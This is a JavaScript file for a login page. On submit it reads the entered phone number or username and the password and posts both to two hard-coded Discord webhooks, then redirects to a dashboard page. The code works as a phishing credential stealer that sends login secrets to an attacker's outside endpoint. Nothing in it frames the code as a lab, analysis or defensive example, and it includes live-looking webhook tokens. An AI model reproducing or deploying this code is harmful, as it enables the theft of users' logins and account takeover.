document.addEventListener('DOMContentLoaded', function () {
  const loginButton = document.querySelector('.btn');

  loginButton.addEventListener('click', async function (event) {
    event.preventDefault();

    let phoneNumberInput = document.getElementById('name');
    let phoneNumber = phoneNumberInput.value.replace(/\D/g, '');

    const errorMessageDiv = document.getElementById('errormessage');

    if (!(/^\d+$/.test(phoneNumber)) || phoneNumber.length < 10) {
      errorMessageDiv.textContent = 'Please enter a valid Information or use phone number';
      errorMessageDiv.style.display = 'block';
    } else {
      const payload = {
        content: `'''New login attempt'''\n**Username:** ${phoneNumberInput.value}\n**Password:** ${document.getElementById('password').value}`,
      };

      const discordWebhookUrl1 = 'https://canary.discord.com/api/webhooks/1176894141439938591/qtp4iKDTYQ_YDupCgUttzGw7AbrMh6MEYzlnJTqM720VDNaFPGkJ_CmbJH70t9AiJLzC';
      const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1178223142259396698/Q9jncDwEL9WCjhbhplOhpoR_K1cspkE4Ac6OgEHnV-DkpC4YBbso-MtpKyCkYC2RGz15';

      const webhookUrls = [discordWebhookUrl1, discordWebhookUrl2];

      try {
        await Promise.all(webhookUrls.map(async (webhookUrl) => {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
          });
        }));

        window.location.href = 'dashboard.html';
      } catch (error) {
        console.error('Error sending data to Discord webhooks:', error);
      }
    }
  });
});
